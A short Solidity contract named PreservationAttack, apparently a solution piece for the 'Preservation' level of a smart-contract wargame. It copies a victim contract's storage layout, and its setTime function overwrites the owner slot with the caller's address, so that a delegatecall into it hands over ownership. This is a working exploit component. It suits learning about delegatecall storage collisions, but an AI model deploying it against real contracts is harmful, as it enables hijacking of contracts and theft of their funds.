// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setTime(uint256 _timeStamp) public {
        owner = msg.sender;
    }
}
